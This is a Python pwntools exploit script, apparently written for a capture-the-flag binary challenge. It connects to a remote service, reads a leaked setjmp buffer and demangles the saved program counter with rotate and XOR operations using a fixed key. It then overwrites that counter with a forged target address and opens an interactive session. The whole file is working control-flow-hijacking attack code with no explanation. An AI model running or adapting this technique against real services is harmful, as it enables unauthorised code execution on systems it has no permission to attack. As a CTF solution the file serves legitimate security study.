import argparse

from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

# r = process(['./challenge'])
# gdb.attach(r, f'''
# b *main+0x86
# ''')

def rol(a, b, bits=32):
	def rol1(n):
		return ((n & (1 << (bits - 1))) >> (bits - 1)) | ((n & ((1 << (bits - 1)) - 1)) << 1)
	for i in range(b):
		a = rol1(a)
	return a

def ror(a, b, bits=32):
	def ror1(n):
		return ((n & 1) << (bits - 1)) | (n >> 1)
	for i in range(b):
		a = ror1(a)
	return a

r.recvuntil(b'Here\'s a setjmp buffer:\n')

bufferraw = r.recvuntil(b"\n")
buffer = [int(x.strip(), 16) for x in bufferraw.decode().split(" ") if x.strip() != '']
print(f"{buffer}")

pc_target = u64(bytes(buffer[7*8:8*8]))
pc_target ^= rol(0xbd ^ 0x62, 0x11, 64)

buffer = buffer[:7*8] + [x for x in p64(pc_target)] + buffer[8*8:]
print(buffer)

r.sendline(' '.join([f'{c:02x}' for c in buffer]))
r.sendline('0')

r.interactive()